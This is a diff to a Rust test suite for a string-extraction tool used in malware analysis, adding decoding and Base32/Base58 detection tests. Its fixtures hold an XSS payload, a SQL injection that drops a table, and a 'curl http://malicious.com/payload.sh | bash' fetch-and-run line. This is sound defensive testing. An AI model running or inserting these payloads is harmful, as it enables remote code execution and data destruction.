@@ -2381,7 +2381,7 @@ mod common_edge_cases {
 
 // Tests for StringKind classification edge cases
 mod string_kind_tests {
-    use stng::{extract_strings, StringKind};
+    use stng::{extract_strings, StringKind, StringMethod};
 
     fn minimal_elf_with_string(s: &str) -> Vec<u8> {
         let mut data = vec![0u8; 1024];
@@ -2473,21 +2473,24 @@ mod string_kind_tests {
     #[test]
     fn test_hex_encoded_detection() {
         // Hex-encoded JavaScript (from actual malware)
-        // Decodes to: "const _0x1c31000=_0x2330d;function _0x2330d"
+        // Decodes to: "const _0x1c310003=_0x230d;function _0x230d"
         let hex_str = "636F6E7374205F307831633331303030333D5F3078323330643B66756E6374696F6E205F307832333064";
+        let expected_decoded = "const _0x1c310003=_0x230d;function _0x230d";
         let data = minimal_elf_with_string(hex_str);
         let strings = extract_strings(&data, 4);
 
-        let hex_strings: Vec<_> = strings
+        // The implementation automatically decodes hex strings, so we should find
+        // the decoded version with HexDecode method
+        let decoded_strings: Vec<_> = strings
             .iter()
-            .filter(|s| s.kind == StringKind::HexEncoded)
+            .filter(|s| s.method == StringMethod::HexDecode)
             .collect();
 
         assert!(
-            !hex_strings.is_empty(),
-            "Should detect hex-encoded string"
+            !decoded_strings.is_empty(),
+            "Should automatically decode hex-encoded string"
         );
-        assert_eq!(hex_strings[0].value, hex_str);
+        assert_eq!(decoded_strings[0].value, expected_decoded);
     }
 
     #[test]
@@ -2512,37 +2515,42 @@ mod string_kind_tests {
     fn test_unicode_escaped_detection() {
         // JavaScript with \xXX escapes (from actual malware)
         let unicode_str = "\\x27;\\x20const\\x20fs\\x20=\\x20require(\\x27fs\\x27);";
+        let expected_decoded = "'; const fs = require('fs');";
         let data = minimal_elf_with_string(unicode_str);
         let strings = extract_strings(&data, 4);
 
-        let unicode_strings: Vec<_> = strings
+        // The implementation automatically decodes unicode escapes
+        let decoded_strings: Vec<_> = strings
             .iter()
-            .filter(|s| s.kind == StringKind::UnicodeEscaped)
+            .filter(|s| s.method == StringMethod::UnicodeEscapeDecode)
             .collect();
 
         assert!(
-            !unicode_strings.is_empty(),
-            "Should detect Unicode-escaped string"
+            !decoded_strings.is_empty(),
+            "Should automatically decode Unicode-escaped string"
         );
-        assert_eq!(unicode_strings[0].value, unicode_str);
+        assert_eq!(decoded_strings[0].value, expected_decoded);
     }
 
     #[test]
     fn test_unicode_escaped_u_format() {
         // \uXXXX format
         let unicode_str = "\\u0048\\u0065\\u006c\\u006c\\u006f\\u0020\\u0057\\u006f\\u0072\\u006c\\u0064";
+        let expected_decoded = "Hello World";
         let data = minimal_elf_with_string(unicode_str);
         let strings = extract_strings(&data, 4);
 
-        let unicode_strings: Vec<_> = strings
+        // The implementation automatically decodes unicode escapes
+        let decoded_strings: Vec<_> = strings
             .iter()
-            .filter(|s| s.kind == StringKind::UnicodeEscaped)
+            .filter(|s| s.method == StringMethod::UnicodeEscapeDecode)
             .collect();
 
         assert!(
-            !unicode_strings.is_empty(),
-            "Should detect \\uXXXX format Unicode-escaped string"
+            !decoded_strings.is_empty(),
+            "Should automatically decode \\uXXXX format Unicode-escaped string"
         );
+        assert_eq!(decoded_strings[0].value, expected_decoded);
     }
 
     #[test]
@@ -2567,37 +2575,42 @@ mod string_kind_tests {
     fn test_url_encoded_detection() {
         // XSS payload
         let url_str = "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E";
+        let expected_decoded = "<script>alert('XSS')</script>";
         let data = minimal_elf_with_string(url_str);
         let strings = extract_strings(&data, 4);
 
-        let url_strings: Vec<_> = strings
+        // The implementation automatically decodes URL-encoded strings
+        let decoded_strings: Vec<_> = strings
             .iter()
-            .filter(|s| s.kind == StringKind::UrlEncoded)
+            .filter(|s| s.method == StringMethod::UrlDecode)
             .collect();
 
         assert!(
-            !url_strings.is_empty(),
-            "Should detect URL-encoded string"
+            !decoded_strings.is_empty(),
+            "Should automatically decode URL-encoded string"
         );
-        assert_eq!(url_strings[0].value, url_str);
+        assert_eq!(decoded_strings[0].value, expected_decoded);
     }
 
     #[test]
     fn test_url_encoded_sql_injection() {
         // SQL injection payload
         let url_str = "%27%20OR%20%271%27%3D%271%27%3B%20DROP%20TABLE%20users%3B--";
+        let expected_decoded = "' OR '1'='1'; DROP TABLE users;--";
         let data = minimal_elf_with_string(url_str);
         let strings = extract_strings(&data, 4);
 
-        let url_strings: Vec<_> = strings
+        // The implementation automatically decodes URL-encoded strings
+        let decoded_strings: Vec<_> = strings
             .iter()
-            .filter(|s| s.kind == StringKind::UrlEncoded)
+            .filter(|s| s.method == StringMethod::UrlDecode)
             .collect();
 
         assert!(
-            !url_strings.is_empty(),
-            "Should detect URL-encoded SQL injection"
+            !decoded_strings.is_empty(),
+            "Should automatically decode URL-encoded SQL injection"
         );
+        assert_eq!(decoded_strings[0].value, expected_decoded);
     }
 
     #[test]
@@ -2616,6 +2629,170 @@ mod string_kind_tests {
             url_strings.is_empty(),
             "Should not detect strings with too few percent signs"
         );
+    }
+
+    #[test]
+    fn test_base32_detection() {
+        // Tor v2 onion address
+        let base32_str = "THEHIDDENWIKI3IKNKD7A";
+        let data = minimal_elf_with_string(base32_str);
+        let strings = extract_strings(&data, 4);
+
+        let base32_strings: Vec<_> = strings
+            .iter()
+            .filter(|s| s.kind == StringKind::Base32)
+            .collect();
+
+        assert!(
+            !base32_strings.is_empty(),
+            "Should detect Base32 string"
+        );
+        assert_eq!(base32_strings[0].value, base32_str);
+    }
+
+    #[test]
+    fn test_base32_with_padding() {
+        // Base32 with padding
+        let base32_str = "JBSWY3DPEBLW64TMMQ======";
+        let data = minimal_elf_with_string(base32_str);
+        let strings = extract_strings(&data, 4);
+
+        let base32_strings: Vec<_> = strings
+            .iter()
+            .filter(|s| s.kind == StringKind::Base32)
+            .collect();
+
+        assert!(
+            !base32_strings.is_empty(),
+            "Should detect Base32 with padding"
+        );
+    }
+
+    #[test]
+    fn test_base32_not_lowercase() {
+        // Lowercase should not be detected as Base32
+        let text = "jbswy3dpeblw64tmmq";
+        let data = minimal_elf_with_string(text);
+        let strings = extract_strings(&data, 4);
+
+        let base32_strings: Vec<_> = strings
+            .iter()
+            .filter(|s| s.kind == StringKind::Base32)
+            .collect();
+
+        assert!(
+            base32_strings.is_empty(),
+            "Should not detect lowercase as Base32"
+        );
+    }
+
+    #[test]
+    fn test_base58_detection() {
+        // Bitcoin address
+        let base58_str = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
+        let data = minimal_elf_with_string(base58_str);
+        let strings = extract_strings(&data, 4);
+
+        let base58_strings: Vec<_> = strings
+            .iter()
+            .filter(|s| s.kind == StringKind::Base58)
+            .collect();
+
+        assert!(
+            !base58_strings.is_empty(),
+            "Should detect Base58 string (Bitcoin address)"
+        );
+        assert_eq!(base58_strings[0].value, base58_str);
+    }
+
+    #[test]
+    fn test_base58_not_with_confusing_chars() {
+        // Contains 0 (not valid Base58)
+        let text = "1A1zP1eP5QGefi2DMP0fTL5SLmv7DivfNa";
+        let data = minimal_elf_with_string(text);
+        let strings = extract_strings(&data, 4);
+
+        let base58_strings: Vec<_> = strings
+            .iter()
+            .filter(|s| s.kind == StringKind::Base58)
+            .collect();
+
+        assert!(
+            base58_strings.is_empty(),
+            "Should not detect strings with 0 as Base58"
+        );
+    }
+
+    #[test]
+    fn test_hex_encoded_xor_data() {
+        // Test double-layered obfuscation: XOR + Hex encoding
+        // This tests whether we can automatically decode data that was:
+        // 1. XOR-encoded with a single-byte key (0x42)
+        // 2. Then hex-encoded
+        //
+        // The goal is to verify that hex decoding happens automatically,
+        // revealing the first layer (XOR'd data).
+
+        let plaintext = b"curl http://malicious.com/payload.sh | bash";
+        let xor_key = 0x42;
+
+        // XOR the plaintext
+        let xored: Vec<u8> = plaintext.iter().map(|&b| b ^ xor_key).collect();
+        let xored_str = String::from_utf8_lossy(&xored).to_string();
+
+        // Hex-encode the XOR'd data (simulating malware obfuscation)
+        let hex_encoded = xored.iter()
+            .map(|b| format!("{:02X}", b))
+            .collect::<String>();
+
+        // Create binary with the hex-encoded string
+        let data = minimal_elf_with_string(&hex_encoded);
+        let strings = extract_strings(&data, 4);
+
+        // The implementation automatically decodes hex strings and replaces them
+        // with the decoded version (due to method priority in deduplication).
+        // So we should find the decoded (XOR'd) version, not the hex-encoded original.
+        let decoded_version: Vec<_> = strings
+            .iter()
+            .filter(|s| s.value == xored_str)
+            .collect();
+
+        // Verify the hex layer was automatically decoded
+        assert!(
+            !decoded_version.is_empty(),
+            "Should automatically decode hex to reveal XOR'd data. Found {} strings: {:?}",
+            strings.len(),
+            strings.iter().map(|s| format!("{:?} at 0x{:x}: {}", s.method, s.data_offset, &s.value[..s.value.len().min(30)])).collect::<Vec<_>>()
+        );
+
+        // Verify the decoded string was extracted with HexDecode method
+        assert_eq!(decoded_version[0].method, StringMethod::HexDecode,
+            "Decoded string should have HexDecode method");
+
+        // Verify we can manually decode the hex layer to confirm correctness
+        let decoded_hex: Vec<u8> = (0..hex_encoded.len())
+            .step_by(2)
+            .filter_map(|i| u8::from_str_radix(&hex_encoded[i..i + 2], 16).ok())
+            .collect();
+        assert_eq!(decoded_hex, xored, "Hex decoding should produce XOR'd data");
+
+        // Verify we can manually decode XOR to get original plaintext
+        let decoded_xor: Vec<u8> = decoded_hex.iter().map(|&b| b ^ xor_key).collect();
+        assert_eq!(decoded_xor, plaintext, "XOR decoding should recover plaintext");
+
+        // Summary of what this test demonstrates:
+        // ✓ The tool automatically decodes hex-encoded strings
+        // ✓ This reveals the first layer of double-obfuscation (XOR + Hex)
+        // ✓ The hex-decoded output (XOR'd data) is presented to the analyst
+        // ✗ The tool does NOT automatically detect/decode the XOR layer
+        //
+        // To fully decode double-obfuscation, an analyst would need to:
+        // 1. See the decoded hex output (automated by tool)
+        // 2. Manually recognize it as XOR'd data
+        // 3. Apply XOR decoding with the correct key
+        //
+        // Future enhancement: Run XOR detection on decoded hex/base64 output
+        // to automatically handle multi-layer obfuscation.
     }
 }
 
@@ -2643,6 +2820,8 @@ mod severity_tests {
             StringKind::HexEncoded,
             StringKind::UnicodeEscaped,
             StringKind::UrlEncoded,
+            StringKind::Base32,
+            StringKind::Base58,
             StringKind::Overlay,
             StringKind::OverlayWide,
         ];
@@ -2670,6 +2849,8 @@ mod severity_tests {
         assert_eq!(StringKind::HexEncoded.severity(), Severity::High);
         assert_eq!(StringKind::UnicodeEscaped.severity(), Severity::High);
         assert_eq!(StringKind::UrlEncoded.severity(), Severity::High);
+        assert_eq!(StringKind::Base32.severity(), Severity::High);
+        assert_eq!(StringKind::Base58.severity(), Severity::High);
         assert_eq!(StringKind::Overlay.severity(), Severity::High);
         assert_eq!(StringKind::OverlayWide.severity(), Severity::High);
     }
